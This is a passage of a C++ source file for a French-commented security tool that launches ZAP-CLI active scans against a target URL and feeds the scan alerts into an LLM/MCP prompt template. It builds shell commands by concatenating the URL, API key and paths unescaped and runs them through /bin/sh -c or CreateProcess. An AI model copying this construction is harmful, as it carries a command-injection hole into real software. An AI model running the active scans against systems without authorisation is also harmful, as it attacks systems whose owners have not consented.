// main.cpp - AgentFactory (cross-platform: Windows + POSIX)
// Délégation vers ZAP-CLI, MCP, K8s — version portable.
//
// Remarques portage :
// - Console: ANSI partout; sous Windows, on tente d'activer VT (ENABLE_VIRTUAL_TERMINAL_PROCESSING).
// - run_command_capture: Windows -> CreateProcess + pipes ; POSIX -> fork/exec + pipes + select()
// - run_zapcli_ascan_progress: idem, 2 implémentations.
// - get_exe_parent_dir: Windows -> GetModuleFileNameA ; POSIX -> readlink(/proc/self/exe), fallback argv[0] (via _init_argv0)
// - KUBECONFIG: setenv() sous POSIX, _putenv_s sous Windows (conservé).
// - Résolution des binaires K8s: on accepte .exe (Windows) et sans extension (POSIX).

// ====== En-tête commun (à placer TOUT EN HAUT du fichier) ======
#if defined(_MSC_VER)
  #pragma warning(push, 0)
#endif

// C++ std
#include <cstdlib>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>
#include <iostream>
#include <sstream>
#include <fstream>
#include <iomanip>
#include <algorithm>
#include <set>
#include <thread>
#include <chrono>
#include <ctime>
#include <regex>
#include <unordered_set>
#include <filesystem>   // C++17
#include <map>   // <-- ajoute ceci


// nlohmann::json (robuste aux deux chemins)
#if __has_include("json.hpp")
  #include "json.hpp"
#elif __has_include(<nlohmann/json.hpp>)
  #include <nlohmann/json.hpp>
#else
  #error "nlohmann json header not found. Place 'json.hpp' near main.cpp or install nlohmann/json."
#endif

// Plateforme
#ifdef _WIN32
  #ifndef NOMINMAX
  #define NOMINMAX 1
  #endif
  #include <windows.h>
  #include <io.h>
  #include <fcntl.h>
#else
  #include <unistd.h>
  #include <sys/types.h>
  #include <sys/wait.h>
  #include <sys/select.h>
  #include <sys/time.h>
  #include <signal.h>
  #include <errno.h>
  #include <fcntl.h>
  #include <limits.h>
#endif

#if defined(_MSC_VER)
  #pragma warning(pop)
#endif

// Aliases
using json = nlohmann::json;
namespace fs = std::filesystem;

// ---------- petites aides ----------
static void loginfo(const std::string &s){ std::cout << s << std::endl; }
static void logerr (const std::string &s){ std::cerr << "ERR: " << s << std::endl; }

// ---------- ANSI color helpers (Windows-safe) ----------
#ifdef _WIN32
static bool enable_ansi_colors() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == INVALID_HANDLE_VALUE) return false;
    DWORD mode = 0;
    if (!GetConsoleMode(hOut, &mode)) return false;
    // ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
    if (mode & 0x0004) return true; // déjà activé
    return SetConsoleMode(hOut, mode | 0x0004);
}
#else
static bool enable_ansi_colors() { return true; }
#endif

namespace ansi {
    static constexpr const char* reset  = "\x1b[0m";
    static constexpr const char* white  = "\x1b[97m";
    static constexpr const char* green  = "\x1b[92m";
    static constexpr const char* blue   = "\x1b[94m";
    static constexpr const char* pink   = "\x1b[38;5;213m";
    static constexpr const char* sky    = "\x1b[96m";
    static constexpr const char* yellow = "\x1b[93m";
    static constexpr const char* orange = "\x1b[38;5;208m";
    static constexpr const char* red    = "\x1b[91m";
}

// Ajoute ceci près du début du fichier (utilitaire pour répéter une chaîne UTF-8)
static std::string utf8_repeat(const std::string &s, int n) {
    if (n <= 0) return std::string();
    const int MAX_REPEAT = 200; // cap affichage
    if (n > MAX_REPEAT) n = MAX_REPEAT;
    std::string out;
    size_t reserveBytes = s.size() * (size_t)n;
    if (reserveBytes > 1000000) reserveBytes = 1000000;
    out.reserve(reserveBytes);
    for (int i = 0; i < n; ++i) out += s;
    return out;
}

// Count printable columns in a UTF-8 string (1 per code point; good enough for Latin/accents)
static size_t utf8_cols(const std::string& s){
    size_t cols = 0;
    for (unsigned char c : s){
        // count only leading bytes (not 10xxxxxx continuation bytes)
        if ((c & 0xC0) != 0x80) ++cols;
    }
    return cols;
}

// Pad with spaces to reach total columns (using utf8_cols)
static std::string pad_cols(size_t total_cols, const std::string& current){
    size_t used = utf8_cols(current);
    return std::string(total_cols > used ? (total_cols - used) : 0, ' ');
}

// ---------- Affichage Dark Moon (portable ANSI, pas d'API console Windows) ----------
static void print_dark_moon() {
    // On utilise exclusivement les séquences ANSI pour rester portable.
    enable_ansi_colors();

    auto SET = [](const char* fg){ std::cout << fg; };
    auto RST = [](){ std::cout << ansi::reset; };

    std::cout << "\n";
    SET(ansi::white);
    std::cout << " Version 1.0.4";
    SET(ansi::yellow);
    std::cout << "...............";
    SET(ansi::white);
    std::cout << "By Mehdi Boutayeb - ASC   ";
    RST();
    std::cout << " \n";
    std::cout << " \n";

    SET(ansi::blue);  std::cout << "  * ";
    SET(ansi::yellow);std::cout << "             __...__";
    SET(ansi::blue);  std::cout << "                           o  \n";

    SET(ansi::yellow);std::cout << "             .--'    __.=-.                            \n";

    SET(ansi::blue);  std::cout << "      |";
    SET(ansi::yellow);std::cout << "    ./     .-' ";
    SET(ansi::blue);  std::cout << "      *             o       \n";

    SET(ansi::blue);  std::cout << "     -O- ";
    SET(ansi::yellow);std::cout << "  /      /   ";
    SET(ansi::white); std::cout << "           _          _        \n";

    SET(ansi::blue);  std::cout << "      |";
    SET(ansi::yellow);std::cout << "   /   '''/ ";
    SET(ansi::blue);  std::cout << "  |";
    SET(ansi::white); std::cout << "        __| |__ _ _ _| |__     \n";

    SET(ansi::yellow);std::cout << "         |     (@)  ";
    SET(ansi::blue);  std::cout << "-O-";
    SET(ansi::white); std::cout << "      / _` / _` | '_| / /     \n";

    SET(ansi::yellow);std::cout << "        |        \\";
    SET(ansi::blue);  std::cout << "   |";
    SET(ansi::white); std::cout << "       \\__,_\\__,_|_| |_\\_\\    \n";

    SET(ansi::yellow);std::cout << "        |         \\";
    SET(ansi::white); std::cout << "           _ __  ___  ___ _ _     \n";

    SET(ansi::yellow);std::cout << "        |       ___\\";
    SET(ansi::white); std::cout << "         | '  \\/ _ \\/ _ \\ ' \\    \n";

    SET(ansi::blue);  std::cout << "  *";
    SET(ansi::yellow);std::cout << "     |  .   /  `";
    SET(ansi::white); std::cout << "          |_|_|_\\___/\\___/_||_|   \n";

    SET(ansi::yellow);std::cout << "         \\  `~~\\ ";
    std::cout << "*                                 \n";

    SET(ansi::yellow);std::cout << "          \\     \\";
    SET(ansi::white); std::cout << "                  Dark Moon    ";
    SET(ansi::blue);  std::cout << "  |   \n";

    SET(ansi::yellow);std::cout << "          `\\    `-.__ ";
    SET(ansi::white); std::cout << "           Cybersecurity ";
    SET(ansi::blue);  std::cout << "    -O-  \n";

    SET(ansi::blue);  std::cout << "     * ";
    SET(ansi::yellow);std::cout << "      `--._    `--=.";
    SET(ansi::blue);  std::cout << "                        |   \n";

    SET(ansi::yellow);std::cout << "                  `---~~`";
    SET(ansi::blue);  std::cout << "                *             \n";
    std::cout << "                          *                         *  \n";

    std::cout << ansi::reset << "\n";
}

// ---------- Pretty console helpers (flex, Unicode safe) ----------
static void print_header_box(const std::string& title){
    const int pad = 2;
    int w = (int)title.size() + pad*2;
    auto B = [](){ return ansi::blue; };
    auto S = [](){ return ansi::sky; };
    auto R = [](){ return ansi::reset; };

    std::cout << B() << u8"┌" << utf8_repeat(u8"─", w) << u8"┐" << R() << "\n";
    std::cout << B() << u8"│" << R() << std::string(pad, ' ')
              << S() << title << R() << std::string(pad, ' ')
              << B() << u8"│" << R() << "\n";
    std::cout << B() << u8"└" << utf8_repeat(u8"─", w) << u8"┘" << R() << "\n";
}

// key/value table with dynamic width
static std::string truncate_for_display(const std::string &s, size_t max_len) {
    if (s.size() <= max_len) return s;
    if (max_len <= 3) return s.substr(0, max_len);
    return s.substr(0, max_len - 3) + "...";
}

static void print_kv_table(const std::vector<std::pair<std::string,std::string>>& rows,
                           const std::unordered_set<std::string>& green_titles = {})
{
    const size_t MAX_COL = 200;
    size_t leftW = 0, rightW = 0;
    std::vector<std::pair<std::string,std::string>> tr;
    tr.reserve(rows.size());
    for (const auto &kv : rows) {
        std::string k = truncate_for_display(kv.first,  MAX_COL);
        std::string v = truncate_for_display(kv.second, MAX_COL);
        leftW  = std::max(leftW,  utf8_cols(k));
        rightW = std::max(rightW, utf8_cols(v));
        tr.emplace_back(std::move(k), std::move(v));
    }

    auto B = [](){ return ansi::blue;  };
    auto W = [](){ return ansi::white; };
    auto G = [](){ return ansi::green; };
    auto R = [](){ return ansi::reset; };

    // top border
    std::cout << B() << u8"┌" << utf8_repeat(u8"─", (int)leftW+2)
              << u8"┬" << utf8_repeat(u8"─", (int)rightW+2)
              << u8"┐" << R() << "\n";

    for (size_t i=0;i<tr.size();++i){
        const auto& k = tr[i].first;
        const auto& v = tr[i].second;
        bool leftIsGreen = (!k.empty() && green_titles.find(k) != green_titles.end());
        const char* leftColor = leftIsGreen ? G() : W();

        std::cout << B() << u8"│ " << leftColor << k << R() << pad_cols(leftW, k)
                  << B() << u8" │ " << W() << v << R() << pad_cols(rightW, v)
                  << B() << u8" │" << R() << "\n";

        if (i+1<tr.size()){
            std::cout << B() << u8"├" << utf8_repeat(u8"─", (int)leftW+2)
                      << u8"┼" << utf8_repeat(u8"─", (int)rightW+2)
                      << u8"┤" << R() << "\n";
        }
    }

    // bottom border
    std::cout << B() << u8"└" << utf8_repeat(u8"─", (int)leftW+2)
              << u8"┴" << utf8_repeat(u8"─", (int)rightW+2)
              << u8"┘" << R() << "\n";
}

static void print_target_box(const std::string& target_orig, const std::string& reason_orig){
    const size_t MAX_DISPLAY = 200;
    std::string target = truncate_for_display(target_orig, MAX_DISPLAY);
    std::string reason = truncate_for_display(reason_orig, MAX_DISPLAY);

    const std::string k1 = "Target";
    const std::string k2 = "Reason";

    const size_t leftW  = std::max(utf8_cols(k1), utf8_cols(k2));
    const size_t rightW = std::max(utf8_cols(target), utf8_cols(reason));

    auto B = [](){ return ansi::blue;  };
    auto S = [](){ return ansi::sky; };
    auto W = [](){ return ansi::white; };
    auto R = [](){ return ansi::reset; };

    std::cout << B() << u8"┌" << utf8_repeat(u8"─", static_cast<int>(leftW) + 2)
              << u8"┬" << utf8_repeat(u8"─", static_cast<int>(rightW) + 2)
              << u8"┐" << R() << "\n";

    std::cout << B() << u8"│ " << S() << k1 << R() << pad_cols(leftW, k1)
              << B() << u8" │ " << W() << target << R() << pad_cols(rightW, target)
              << B() << u8" │" << R() << "\n";

    std::cout << B() << u8"├" << utf8_repeat(u8"─", static_cast<int>(leftW) + 2)
              << u8"┼" << utf8_repeat(u8"─", static_cast<int>(rightW) + 2)
              << u8"┤" << R() << "\n";

    std::cout << B() << u8"│ " << S() << k2 << R() << pad_cols(leftW, k2)
              << B() << u8" │ " << W() << reason << R() << pad_cols(rightW, reason)
              << B() << u8" │" << R() << "\n";

    std::cout << B() << u8"└" << utf8_repeat(u8"─", static_cast<int>(leftW) + 2)
              << u8"┴" << utf8_repeat(u8"─", static_cast<int>(rightW) + 2)
              << u8"┘" << R() << "\n";
}

// Progress bar (10 blocs, UTF-8 safe)
static void render_progress_percent(int percent){
    if (percent < 0) { percent = 0; }
    if (percent > 100) { percent = 100; }
    int blocks = percent / 10; // 0..10
    const std::string filled = u8"■";
    const std::string empty  = u8"□";
    std::string bar = utf8_repeat(filled, blocks) + utf8_repeat(empty, 10 - blocks);
    std::ostringstream oss;
    oss << "\r" << ansi::yellow << "Progress: " << bar << " " << std::setw(3) << percent << "%" << ansi::reset;
    std::cout << oss.str();
    std::cout.flush();
}

// -----------------------------------------------------------------------------
// Helpers fichiers, etc.
// -----------------------------------------------------------------------------
static std::string readFile(const std::string &path) {
    std::ifstream ifs(path, std::ios::in | std::ios::binary);
    if (!ifs.is_open()) return std::string();
    std::ostringstream ss;
    ss << ifs.rdbuf();
    return ss.str();
}

static std::string extract_hostname(const std::string &url) {
    std::string s = url;
    size_t p = s.find("://");
    if (p != std::string::npos) s = s.substr(p + 3);
    size_t slash = s.find('/');
    if (slash != std::string::npos) s = s.substr(0, slash);
    for (char &c : s) {
        if (c == ':' || c == '/' || c == '\\' || c == '?' || c == '&' || c == '=')
            c = '_';
    }
    if (s.empty()) {
        s = url;
        std::replace(s.begin(), s.end(), '/', '_');
        std::replace(s.begin(), s.end(), ':', '_');
    }
    return s;
}

static std::string current_datetime_string() {
    std::time_t t = std::time(nullptr);
    std::tm tm{};
#ifdef _WIN32
    localtime_s(&tm, &t);
#else
    localtime_r(&t, &tm);
#endif
    std::ostringstream oss;
    oss << std::put_time(&tm, "%Y%m%d_%H%M%S");
    return oss.str();
}

// -----------------------------------------------------------------------------
// Trouver le dernier alerts_*.json (non-recursif)
// -----------------------------------------------------------------------------
static fs::path find_latest_alerts_json(const fs::path &workdir) {
    fs::path latest;
    fs::file_time_type latest_time;
    bool found = false;
    try {
        for (auto &p : fs::directory_iterator(workdir)) {
            if (!p.is_regular_file()) continue;
            std::string fname = p.path().filename().string();
            if (fname.rfind("alerts_", 0) == 0 && p.path().extension() == ".json") {
                fs::file_time_type t = fs::last_write_time(p.path());
                if (!found || t > latest_time) {
                    latest_time = t;
                    latest = p.path();
                    found = true;
                }
            }
        }
    } catch (const std::exception &ex) {
        logerr(std::string("find_latest_alerts_json: error scanning ") + workdir.string() + " : " + ex.what());
    }
    return latest;
}

// -----------------------------------------------------------------------------
// Fichier récent contenant une sous-chaine (récursif)
// -----------------------------------------------------------------------------
static fs::path find_newest_file_containing(const fs::path &workdir, const std::string &contains) {
    fs::path best;
    fs::file_time_type best_t;
    bool found = false;
    try {
        for (auto &p : fs::recursive_directory_iterator(workdir)) {
            if (!p.is_regular_file()) continue;
            std::string fname = p.path().filename().string();
            if (fname.find(contains) != std::string::npos) {
                fs::file_time_type t = fs::last_write_time(p.path());
                if (!found || t > best_t) { best_t = t; best = p.path(); found = true; }
            }
        }
    } catch(...) {}
    return best;
}

// -----------------------------------------------------------------------------
// get_exe_parent_dir: Windows vs POSIX
// -----------------------------------------------------------------------------
static fs::path get_exe_parent_dir() {
#ifdef _WIN32
    char pathbuf[MAX_PATH];
    DWORD n = GetModuleFileNameA(NULL, pathbuf, MAX_PATH);
    if (n == 0 || n == MAX_PATH) return fs::path(".");
    fs::path p(pathbuf);
    return p.parent_path();
#else
    // try /proc/self/exe
    char buf[PATH_MAX+1] = {0};
    ssize_t n = readlink("/proc/self/exe", buf, PATH_MAX);
    if (n > 0) {
        buf[n] = '\0';
        return fs::path(buf).parent_path();
    }
    // fallback to current path
    return fs::current_path();
#endif
}

// -----------------------------------------------------------------------------
// escape_for_cmdline: utilisé principalement côté Windows; POSIX on passe par /bin/sh -c
// -----------------------------------------------------------------------------
[[maybe_unused]] static std::string escape_for_cmdline(const std::string &s) {
    std::string out; out.reserve(s.size()*2);
    for (unsigned char c : s) {
        if (c == '\\') { out.push_back('\\'); out.push_back('\\'); }
        else if (c == '"') { out.push_back('\\'); out.push_back('"'); }
        else if (c == '\r') { /* ignore */ }
        else if (c == '\n') { out.push_back('\\'); out.push_back('n'); }
        else out.push_back((char)c);
    }
    return out;
}

// -----------------------------------------------------------------------------
// run_command_capture (xplat)
//   - timeout_ms: 0 => pas de timeout
//   - stream_to_console: si true, on réécrit les flux enfant vers stdout/stderr
// -----------------------------------------------------------------------------
static bool run_command_capture(const std::string &cmd,
                                std::string &out_stdout,
                                std::string &out_stderr,
                                unsigned long timeout_ms = 120000,
                                bool stream_to_console = true)
{
    out_stdout.clear();
    out_stderr.clear();

#ifdef _WIN32
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE outRd=NULL,outWr=NULL,errRd=NULL,errWr=NULL;
    if (!CreatePipe(&outRd, &outWr, &sa, 0)) return false;
    if (!SetHandleInformation(outRd, HANDLE_FLAG_INHERIT, 0)) { CloseHandle(outRd); CloseHandle(outWr); return false; }
    if (!CreatePipe(&errRd, &errWr, &sa, 0)) { CloseHandle(outRd); CloseHandle(outWr); return false; }
    if (!SetHandleInformation(errRd, HANDLE_FLAG_INHERIT, 0)) { CloseHandle(outRd); CloseHandle(outWr); CloseHandle(errRd); CloseHandle(errWr); return false; }

    STARTUPINFOA si{}; PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    si.hStdOutput = outWr;
    si.hStdError  = errWr;
    si.dwFlags   |= STARTF_USESTDHANDLES;

    std::vector<char> cmdBuf(cmd.begin(), cmd.end());
    cmdBuf.push_back('\0');

    BOOL ok = CreateProcessA(NULL, cmdBuf.data(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!ok) {
        DWORD err = GetLastError();
        LPVOID msgBuf = nullptr;
        FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                       NULL, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&msgBuf, 0, NULL);
        std::ostringstream oss;
        oss << "CreateProcess failed (error " << err << "): " << (msgBuf ? (const char*)msgBuf : "unknown");
        logerr(oss.str());
        if (msgBuf) LocalFree(msgBuf);
        CloseHandle(outRd); CloseHandle(outWr); CloseHandle(errRd); CloseHandle(errWr);
        return false;
    }

    CloseHandle(outWr);
    CloseHandle(errWr);

    char tmp[4096];
    DWORD avail = 0;
    DWORD start = GetTickCount();

    for (;;) {
        // stdout
        while (PeekNamedPipe(outRd, NULL, 0, NULL, &avail, NULL) && avail) {
            DWORD r = 0;
            if (ReadFile(outRd, tmp, (DWORD)sizeof(tmp), &r, NULL) && r) {
                out_stdout.append(tmp, tmp + r);
                if (stream_to_console) { std::cout.write(tmp, r); std::cout.flush(); }
            } else break;
        }
        // stderr
        while (PeekNamedPipe(errRd, NULL, 0, NULL, &avail, NULL) && avail) {
            DWORD r = 0;
            if (ReadFile(errRd, tmp, (DWORD)sizeof(tmp), &r, NULL) && r) {
                out_stderr.append(tmp, tmp + r);
                if (stream_to_console) { std::cerr.write(tmp, r); std::cerr.flush(); }
            } else break;
        }

        DWORD wait = WaitForSingleObject(pi.hProcess, 100);
        if (wait == WAIT_OBJECT_0) break;

        if (timeout_ms != 0 && (GetTickCount() - start) > timeout_ms) {
            TerminateProcess(pi.hProcess, 1);
            break;
        }
    }

    // drain
    DWORD r = 0;
    while (ReadFile(outRd, tmp, (DWORD)sizeof(tmp), &r, NULL) && r) {
        out_stdout.append(tmp, tmp + r);
        if (stream_to_console) std::cout.write(tmp, r);
    }
    if (stream_to_console) std::cout.flush();

    r = 0;
    while (ReadFile(errRd, tmp, (DWORD)sizeof(tmp), &r, NULL) && r) {
        out_stderr.append(tmp, tmp + r);
        if (stream_to_console) std::cerr.write(tmp, r);
    }
    if (stream_to_console) std::cerr.flush();

    CloseHandle(outRd); CloseHandle(errRd);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return true;

#else
    int out_pipe[2], err_pipe[2];
    if (pipe(out_pipe) == -1) return false;
    if (pipe(err_pipe) == -1) { close(out_pipe[0]); close(out_pipe[1]); return false; }

    pid_t pid = fork();
    if (pid < 0) {
        close(out_pipe[0]); close(out_pipe[1]);
        close(err_pipe[0]); close(err_pipe[1]);
        return false;
    }
    if (pid == 0) {
        // child
        // redirect stdout/stderr
        dup2(out_pipe[1], STDOUT_FILENO);
        dup2(err_pipe[1], STDERR_FILENO);
        close(out_pipe[0]); close(out_pipe[1]);
        close(err_pipe[0]); close(err_pipe[1]);

        // exec via /bin/sh -c "cmd"
        execl("/bin/sh", "sh", "-c", cmd.c_str(), (char*)nullptr);
        _exit(127);
    }

    // parent
    close(out_pipe[1]);
    close(err_pipe[1]);

    // set non-blocking
    int flags;
    flags = fcntl(out_pipe[0], F_GETFL, 0); fcntl(out_pipe[0], F_SETFL, flags | O_NONBLOCK);
    flags = fcntl(err_pipe[0], F_GETFL, 0); fcntl(err_pipe[0], F_SETFL, flags | O_NONBLOCK);

    auto start_tp = std::chrono::steady_clock::now();
    bool done = false;

    while (!done) {
        fd_set rfds;
        FD_ZERO(&rfds);
        int maxfd = -1;
        FD_SET(out_pipe[0], &rfds);
        if (out_pipe[0] > maxfd) maxfd = out_pipe[0];
        FD_SET(err_pipe[0], &rfds);
        if (err_pipe[0] > maxfd) maxfd = err_pipe[0];

        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 200 * 1000; // 200 ms

        int rv = select(maxfd + 1, &rfds, nullptr, nullptr, &tv);
        if (rv > 0) {
            char buf[4096];
            if (FD_ISSET(out_pipe[0], &rfds)) {
                ssize_t r = read(out_pipe[0], buf, sizeof(buf));
                if (r > 0) {
                    out_stdout.append(buf, buf + r);
                    if (stream_to_console) { std::cout.write(buf, r); std::cout.flush(); }
                }
            }
            if (FD_ISSET(err_pipe[0], &rfds)) {
                ssize_t r = read(err_pipe[0], buf, sizeof(buf));
                if (r > 0) {
                    out_stderr.append(buf, buf + r);
                    if (stream_to_console) { std::cerr.write(buf, r); std::cerr.flush(); }
                }
            }
        }

        // check child
        int status = 0;
        pid_t w = waitpid(pid, &status, WNOHANG);
        if (w == pid) {
            done = true;
        }

        // timeout
        if (timeout_ms != 0) {
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - start_tp).count();
            if (!done && (unsigned long)elapsed > timeout_ms) {
                kill(pid, SIGKILL);
                waitpid(pid, &status, 0);
                done = true;
            }
        }
    }

    // drain remaining data
    {
        char buf[4096];
        ssize_t r = 0;
        do {
            r = read(out_pipe[0], buf, sizeof(buf));
            if (r > 0) {
                out_stdout.append(buf, buf + r);
                if (stream_to_console) { std::cout.write(buf, r); }
            }
        } while (r > 0);
        if (stream_to_console) std::cout.flush();

        do {
            r = read(err_pipe[0], buf, sizeof(buf));
            if (r > 0) {
                out_stderr.append(buf, buf + r);
                if (stream_to_console) { std::cerr.write(buf, r); }
            }
        } while (r > 0);
        if (stream_to_console) std::cerr.flush();
    }

    close(out_pipe[0]);
    close(err_pipe[0]);
    return true;
#endif
}

// -----------------------------------------------------------------------------
// call_mcp_display_with_file / call_mcp_analyze / call_mcp_report_with_files
// (déclarations — implémentations complètes en Partie 2/2, inchangées côté logique,
// mais reposent sur run_command_capture ci-dessus pour la portabilité.)
// -----------------------------------------------------------------------------
static bool call_mcp_display_with_file(const fs::path &mcp_path, const fs::path &alerts_file, const fs::path &exe_parent, std::string &mcp_raw_out);
static bool call_mcp_analyze(const fs::path &mcp_path, const fs::path &alerts_json_path, const fs::path &out_urls_json, std::string &mcp_out);
static bool call_mcp_report_with_files(const fs::path &mcp_path,
                                       const fs::path &exe_parent,
                                       const std::vector<fs::path> &files_to_inject,
                                       const std::string &tpl_name,
                                       std::string &mcp_raw_out,
                                       const fs::path &html_out_path = fs::path());


// -----------------------------------------------------------------------------
// run_zapcli_ascan_progress (xplat, avec parsing progress: "progress: N%")
// -----------------------------------------------------------------------------
static bool run_zapcli_ascan_progress(const std::string &zapcli_path,
                                      const std::string &host, uint16_t port, const std::string &apikey,
                                      const std::string &baseurl, const fs::path &outdir,
                                      std::string &stdout_out, std::string &stderr_out)
{
#ifdef _WIN32
    std::ostringstream cmd;
    cmd << '"' << zapcli_path << '"'
        << " --host " << host
        << " --port " << port;
    if (!apikey.empty()) cmd << " --apikey \"" << apikey << '"';
    cmd << " --baseurl \"" << baseurl << '"'
        << " --action ascan"
        << " --outdir \"" << outdir.string() << '"';

    // on réutilise run_command_capture pour simplifier; on parse le flux en live
    // ici on stream_to_console=false pour capter et parser manuellement
    std::string out, err;
    bool ok = run_command_capture(cmd.str(), out, err, 0, false);
    stdout_out = out;
    stderr_out = err;

    // Parse progress increments dans 'out' et 'err'
    std::regex reProgress(R"(progress:\s*(\d+)%\s*)", std::regex_constants::icase);
    auto parse_and_render = [&](const std::string& s){
        std::sregex_iterator it(s.begin(), s.end(), reProgress), end;
        int last=-1;
        for (; it != end; ++it) {
            int p = std::stoi((*it)[1].str());
            if (p != last) { render_progress_percent(p); last = p; }
        }
        if (last < 100) render_progress_percent(100);
        std::cout << std::endl;
    };
    parse_and_render(stdout_out);
    parse_and_render(stderr_out);
    return ok;

#else
    // Sous POSIX, on veut du "live parsing".
    // Implémentation dédiée: on exécute le process via /bin/sh -c et on lit les pipes en boucle
    // pour extraire "progress: N%".
    int out_pipe[2], err_pipe[2];
    if (pipe(out_pipe) == -1) return false;
    if (pipe(err_pipe) == -1) { close(out_pipe[0]); close(out_pipe[1]); return false; }

    std::ostringstream cmdbuf;
    cmdbuf << '"' << zapcli_path << '"'
           << " --host " << host
           << " --port " << port;
    if (!apikey.empty()) cmdbuf << " --apikey \"" << apikey << '"';
    cmdbuf << " --baseurl \"" << baseurl << '"'
           << " --action ascan"
           << " --outdir \"" << outdir.string() << '"';
    const std::string cmd = cmdbuf.str();

    pid_t pid = fork();
    if (pid < 0) {
        close(out_pipe[0]); close(out_pipe[1]);
        close(err_pipe[0]); close(err_pipe[1]);
        return false;
    }
    if (pid == 0) {
        dup2(out_pipe[1], STDOUT_FILENO);
        dup2(err_pipe[1], STDERR_FILENO);
        close(out_pipe[0]); close(out_pipe[1]);
        close(err_pipe[0]); close(err_pipe[1]);
        execl("/bin/sh", "sh", "-c", cmd.c_str(), (char*)nullptr);
        _exit(127);
    }

    close(out_pipe[1]);
    close(err_pipe[1]);

    // non-blocking
    int flags;
    flags = fcntl(out_pipe[0], F_GETFL, 0); fcntl(out_pipe[0], F_SETFL, flags | O_NONBLOCK);
    flags = fcntl(err_pipe[0], F_GETFL, 0); fcntl(err_pipe[0], F_SETFL, flags | O_NONBLOCK);

    std::regex reProgress(R"(progress:\s*(\d+)%\s*)", std::regex_constants::icase);
    int lastShown = -1;

    auto scan_chunk = [&](const std::string& s){
        std::smatch m;
        std::string::const_iterator searchStart( s.cbegin() );
        while (std::regex_search(searchStart, s.cend(), m, reProgress)) {
            int p = std::stoi(m[1].str());
            if (p != lastShown) { render_progress_percent(p); lastShown = p; }
            searchStart = m.suffix().first;
        }
    };

    bool done = false;
    while (!done) {
        fd_set rfds;
        FD_ZERO(&rfds);
        int maxfd = -1;
        FD_SET(out_pipe[0], &rfds);
        if (out_pipe[0] > maxfd) maxfd = out_pipe[0];
        FD_SET(err_pipe[0], &rfds);
        if (err_pipe[0] > maxfd) maxfd = err_pipe[0];

        struct timeval tv; tv.tv_sec=0; tv.tv_usec=200*1000;
        int rv = select(maxfd+1, &rfds, nullptr, nullptr, &tv);

        if (rv > 0) {
            char buf[2048];
            if (FD_ISSET(out_pipe[0], &rfds)) {
                ssize_t r = read(out_pipe[0], buf, sizeof(buf));
                if (r > 0) {
                    stdout_out.append(buf, buf + r);
                    scan_chunk(std::string(buf, buf + r));
                }
            }
            if (FD_ISSET(err_pipe[0], &rfds)) {
                ssize_t r = read(err_pipe[0], buf, sizeof(buf));
                if (r > 0) {
                    stderr_out.append(buf, buf + r);
                    scan_chunk(std::string(buf, buf + r));
                }
            }
        }

        int status=0;
        pid_t w = waitpid(pid, &status, WNOHANG);
        if (w == pid) done = true;
    }

    // flush fin
    if (lastShown < 100) { render_progress_percent(100); }
    std::cout << std::endl;

    // drainer tout
    {
        char buf[2048];
        ssize_t r=0;
        while ((r = read(out_pipe[0], buf, sizeof(buf))) > 0) {
            stdout_out.append(buf, buf + r);
        }
        while ((r = read(err_pipe[0], buf, sizeof(buf))) > 0) {
            stderr_out.append(buf, buf + r);
        }
    }
    close(out_pipe[0]);
    close(err_pipe[0]);
    return true;
#endif
}

// -----------------------------------------------------------------------------
// call_mcp_display_with_file : injecte alerts JSON dans mon_prompt.txt puis MCP
// -----------------------------------------------------------------------------
static bool call_mcp_display_with_file(const fs::path &mcp_path,
                                       const fs::path &alerts_file,
                                       const fs::path &exe_parent,
                                       std::string &mcp_raw_out)
{
    fs::path tpl_path = exe_parent / "mon_prompt.txt";
    if (!fs::exists(tpl_path)) {
        logerr("call_mcp_display_with_file: mon_prompt.txt not found in " + exe_parent.string());
        return false;
    }
    std::string tpl;
    try {
        std::ifstream ifs(tpl_path.string(), std::ios::in | std::ios::binary);
        std::ostringstream ss; ss << ifs.rdbuf(); tpl = ss.str();
    } catch(...) {
        logerr("call_mcp_display_with_file: failed to read mon_prompt.txt");
        return false;
    }

    std::string alerts_content;
    try {
        std::ifstream af(alerts_file.string(), std::ios::in | std::ios::binary);
        std::ostringstream ss; ss << af.rdbuf(); alerts_content = ss.str();
    } catch(...) {
        logerr("call_mcp_display_with_file: failed to read alerts file: " + alerts_file.string());
        return false;
    }

    std::string final_prompt = tpl;
    const std::string placeholder = "{{ALERTS_JSON}}";
    size_t pos = final_prompt.find(placeholder);
    if (pos != std::string::npos) final_prompt.replace(pos, placeholder.length(), alerts_content);
    else {
        final_prompt += "\n\n----- BEGIN ALERTS_JSON (injected file) -----\n";
        final_prompt += alerts_content;
        final_prompt += "\n----- END ALERTS_JSON -----\n";
    }

    fs::path tmp_prompt = exe_parent / "mcp_display_tmp_prompt.txt";
    try {
        std::ofstream ofs(tmp_prompt, std::ios::binary);
        ofs << final_prompt;
        ofs.close();
    } catch (const std::exception &ex) {
        logerr(std::string("call_mcp_display_with_file: failed to write tmp prompt: ") + ex.what());
        return false;
    }

    fs::path mcp_log = exe_parent / "mcp_display_session.log";
    std::ostringstream cmd;
    cmd << '"' << mcp_path.string() << '"'
        << " --engine web"
        << " --log \"" << mcp_log.string() << "\""
        << " --chat-file \"" << tmp_prompt.string() << "\"";

    std::string out, err;
    bool ok = run_command_capture(cmd.str(), out, err, 180000, false);
    mcp_raw_out = out + "\n" + err;
    if (!ok) logerr("call_mcp_display_with_file: MCP process failed (see " + mcp_log.string() + ")");

    auto extract_text = [](const std::string &s)->std::string {
        size_t b = s.find("```");
        if (b != std::string::npos) {
            size_t e = s.find("```", b + 3);
            if (e != std::string::npos && e > b + 3) {
